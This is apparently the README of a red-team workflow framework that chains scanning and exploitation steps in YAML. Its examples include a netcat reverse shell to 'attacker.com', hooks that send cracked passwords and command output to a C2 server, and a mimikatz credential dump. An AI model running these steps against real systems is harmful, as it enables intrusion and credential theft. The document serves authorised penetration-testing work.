# Offensive Flow Executor (OFX)

Workflow automation framework for red teamers. Automate your attack chains with YAML workflows, parallel execution, retry logic, and Python hooks.

## What It Does

- **YAML Workflows**: Define multi-step attack chains in YAML
- **Parallel Jobs**: Run reconnaissance/exploitation jobs simultaneously
- **Retry Logic**: Auto-retry flaky commands (API calls, unstable shells)
- **Python Hooks**: Inject custom code at any point (parse output, send alerts, modify inputs)
- **Template Engine**: Dynamic values with `${{ }}` syntax
- **Reusable Workflows**: Build a library of modular attack components

## Installation

```bash
pip install -e .
# or
uv pip install -e .
```

## Quick Start

```bash
# Run a workflow
ofx flow run recon.yml

# Pass inputs
ofx flow run exploit.yml --input target=192.168.1.100 --input port=8080

# Pass secrets
ofx flow run exploit.yml --secret API_KEY=xxx
```

## Simple Example

**recon.yml:**
```yaml
name: Port Scan + Service Enum

jobs:
  scan:
    steps:
      - name: Port Scan
        run: nmap -p- -T4 ${{ inputs.target }}
        
      - name: Service Detection
        run: nmap -sV -p ${{ steps[0].outputs.open_ports }} ${{ inputs.target }}
        hooks:
          after_step: |
            def hook(output):
                # Parse and store results
                output['services'] = parse_nmap(output['stdout'])
                return output
```

Run it:
```bash
ofx flow run recon.yml --input target=10.0.0.5
```

## Workflow Features

### 1. Parallel Jobs

Run recon tasks simultaneously:

```yaml
jobs:
  port-scan:
    steps:
      - run: nmap -p- ${{ inputs.target }}
  
  subdomain-enum:
    steps:
      - run: subfinder -d ${{ inputs.domain }}
  
  web-enum:
    steps:
      - run: ffuf -u https://${{ inputs.domain }}/FUZZ
```

All jobs run in parallel.

### 2. Job Dependencies

Chain jobs with `needs`:

```yaml
jobs:
  recon:
    steps:
      - name: Find Subdomains
        run: subfinder -d ${{ inputs.domain }} -o subs.txt
  
  exploit:
    needs: [recon]  # Wait for recon to finish
    steps:
      - name: Test Each Subdomain
        run: |
          for sub in $(cat subs.txt); do
            ./exploit.sh $sub
          done
```

### 3. Retry Failed Commands

Auto-retry unreliable commands:

```yaml
steps:
  - name: Unstable Shell
    run: nc -e /bin/bash attacker.com 4444
    max_attempts: 5  # Try 5 times
    timeout: 10      # 10 min timeout
```

### 4. Conditional Steps

Skip steps based on conditions:

```yaml
steps:
  - name: Windows Exploit
    run: ./windows_exploit.exe
    run_if: ${{ env.OS == 'windows' }}
  
  - name: Linux Exploit
    run: ./linux_exploit
    run_if: ${{ env.OS == 'linux' }}
```

### 5. Python Hooks

Inject custom logic anywhere:

```yaml
steps:
  - name: Crack Hash
    run: hashcat -m 1000 hashes.txt wordlist.txt
    hooks:
      after_step: |
        def hook(output):
            # Parse cracked passwords
            passwords = parse_hashcat(output['stdout'])
            output['passwords'] = passwords
            
            # Send to C2
            send_to_c2(passwords)
            return output
      
      on_error: |
        def hook(error):
            notify_operator(f"Hash cracking failed: {error}")
```

**Available hooks:**
- `pre_run`, `post_run` - Before/after step
- `before_step`, `after_step` - Around command execution  
- `on_success`, `on_error` - Success/error handling
- `on_retry` - Before retry (gets `retry_count`, `error`)
- `on_timeout` - When timeout occurs
- `on_skip` - When step skipped

Hooks auto-inject arguments: `inputs`, `outputs`, `command`, `error`, `retry_count`, etc.

### 6. Template Variables

Access data from previous steps:

```yaml
jobs:
  exploit:
    steps:
      - name: Get Creds
        run: ./get_creds.sh
        # Outputs: username, password
      
      - name: Login
        run: |
          curl -X POST https://target.com/login \
            -d "user=${{ steps[0].outputs.username }}" \
            -d "pass=${{ steps[0].outputs.password }}"
      
      - name: Access Data
        run: curl -H "Cookie: ${{ steps[1].outputs.cookie }}"
```

Access job outputs from other jobs:

```yaml
jobs:
  recon:
    steps:
      - run: ./find_admin_panel.sh
        # Sets: outputs.admin_url
  
  exploit:
    needs: [recon]
    steps:
      - run: ./exploit.sh ${{ jobs.recon.outputs.admin_url }}
```

### 7. Reusable Workflows

Build modular components:

**subdomain-enum.yml:**
```yaml
name: Subdomain Enumeration
workflow_call:
  inputs:
    domain:
      required: true

jobs:
  enum:
    steps:
      - run: subfinder -d ${{ inputs.domain }}
      - run: amass enum -d ${{ inputs.domain }}
```

**main-workflow.yml:**
```yaml
jobs:
  recon:
    steps:
      - uses: subdomain-enum.yml
        with:
          domain: target.com
```

## Full Example

**exploit-chain.yml:**
```yaml
name: Full Exploit Chain

jobs:
  recon:
    steps:
      - name: Port Scan
        run: nmap -p- -T4 ${{ inputs.target }} -oG scan.txt
        hooks:
          after_step: |
            def hook(output):
                import re
                ports = re.findall(r'(\d+)/open', output['stdout'])
                output['open_ports'] = ','.join(ports)
                return output
      
      - name: Service Detection  
        run: nmap -sV -p ${{ steps[0].outputs.open_ports }} ${{ inputs.target }}
  
  exploit:
    needs: [recon]
    steps:
      - name: Try Exploits
        run: |
          for port in $(echo ${{ jobs.recon.outputs.open_ports }} | tr ',' ' '); do
            ./auto_exploit.sh ${{ inputs.target }} $port
          done
        max_attempts: 3
        timeout: 30
        hooks:
          on_retry: |
            def hook(retry_count):
                import time
                time.sleep(retry_count * 10)  # Backoff
          
          on_success: |
            def hook(output):
                notify_success("Exploitation successful!")
          
          on_error: |
            def hook(error):
                log_failure(f"All exploits failed: {error}")
```

Run it:
```bash
ofx flow run exploit-chain.yml --input target=10.0.0.50
```

## YAML Reference

**Minimal workflow:**
## YAML Reference

**Minimal workflow:**
```yaml
name: My Workflow

jobs:
  job1:
    steps:
      - name: Do Something
        run: echo "Hello"
```

**All options:**
```yaml
name: My Workflow

defaults:
  shell: bash
  env:
    VAR: value

hooks:
  pre_run: |
    def hook(inputs):
        # Runs before workflow starts
        return inputs

jobs:
  job-id:
    needs: [other-job-id]  # Wait for dependencies
    
    steps:
      - name: Step Name
        run: echo "command"           # Shell command
        # OR
        script: |                     # Python script
          print("hello")
        # OR  
        uses: ./other-workflow.yml    # Nested workflow
        with:
          input_key: value
        
        # Step options
        max_attempts: 3               # Retry count
        timeout: 60                   # Minutes
        run_if: ${{ condition }}      # Conditional
        continue_on_error: true       # Don't fail job
        
        env:
          STEP_VAR: ${{ inputs.var }}
        
        hooks:
          after_step: |
            def hook(output, command):
                # Parse output, modify data
                return output
```

**Template syntax:**
- `${{ inputs.key }}` - Workflow inputs
- `${{ secrets.KEY }}` - Secrets
- `${{ env.VAR }}` - Environment variables
- `${{ steps[0].outputs.key }}` - Previous step outputs
- `${{ jobs.jobid.outputs.key }}` - Job outputs

## How It Works

1. **Parse YAML** → Load and validate workflow schema
2. **Plan Execution** → Resolve job dependencies, create execution stages
3. **Run Jobs in Parallel** → Each stage runs concurrently (ThreadPoolExecutor)
4. **Execute Steps Sequentially** → Within each job, steps run in order
5. **Template Resolution** → `${{ }}` values resolved with context (inputs, outputs, env)
6. **Hook Execution** → Python hooks run at lifecycle points
7. **Retry Logic** → Failed steps auto-retry if `max_attempts > 1`
8. **Result Aggregation** → Collect outputs, status, metadata

**Execution order:**
```
Workflow pre_run hook
  ↓
Job pre_run hook (parallel for each job)
  ↓
on_iter_step hook (before each step)
  ↓
Step pre_run → before_step → EXECUTE → after_step → post_run
  ↓
Job post_run hook
  ↓
Workflow post_run hook
```

## Use Cases

### Automated Pentesting
```yaml
name: Auto Pentest

jobs:
  recon:
    steps:
      - run: nmap -A ${{ inputs.target }}
      - run: subfinder -d ${{ inputs.domain }}
      - run: nuclei -u ${{ inputs.target }}
  
  exploit:
    needs: [recon]
    steps:
      - run: ./auto_exploit.sh ${{ jobs.recon.outputs.vulns }}
```

### C2 Tasking
```yaml
name: Beacon Task

jobs:
  execute:
    steps:
      - name: Run Command
        run: ${{ inputs.command }}
        timeout: 5
        hooks:
          after_step: |
            def hook(output):
                send_to_c2_server(output)
```

### Credential Harvesting
```yaml
name: Cred Dump

jobs:
  dump:
    steps:
      - run: mimikatz "sekurlsa::logonpasswords"
        hooks:
          after_step: |
            def hook(output):
                creds = parse_mimikatz(output['stdout'])
                output['credentials'] = creds
                store_in_database(creds)
                return output
```

## Advanced Features

### Loop Over Targets
```yaml
steps:
  - name: Scan Multiple Targets
    script: |
      for target in ${{ inputs.targets }}:
          os.system(f"nmap {target}")
```

### Error Recovery
```yaml
steps:
  - name: Risky Command
    run: ./unstable_exploit.sh
    hooks:
      on_error: |
        def hook(error):
            rollback_changes()
            alert_operator(f"Failed: {error}")
```

### Dynamic Workflow Loading
```yaml
jobs:
  adaptive:
    steps:
      - name: Detect OS
        run: uname -s
      
      - uses: ${{ steps[0].outputs.os }}-exploit.yml
```

## Testing

```bash
pytest tests/
# or with uv
uv run pytest tests/
```
